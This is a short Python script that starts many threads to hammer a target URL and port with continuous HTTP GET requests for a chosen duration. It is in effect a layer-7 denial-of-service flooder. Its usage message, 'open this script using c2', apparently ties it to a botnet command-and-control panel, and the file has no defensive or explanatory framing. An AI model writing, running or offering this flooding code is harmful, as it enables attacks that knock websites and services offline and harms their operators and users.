import sys
import threading
import time
import requests
from colorama import init, Fore, Style

init(autoreset=True)

def curl_url(url, port, duration, thread_count):
    end_time = time.time() + duration

    def curl_thread():
        while time.time() < end_time:
            try:
                response = requests.get(f"{url}:{port}")
                print(Fore.GREEN + f"SUCCESSFUL Status Code: {response.status_code}")
            except requests.RequestException as e:
                print(Fore.RED + f"FAILED Request failed: {e}")

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=curl_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("open this script using c2")
        sys.exit(1)

    url = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    thread_count = int(sys.argv[4])

    curl_url(url, port, duration, thread_count)
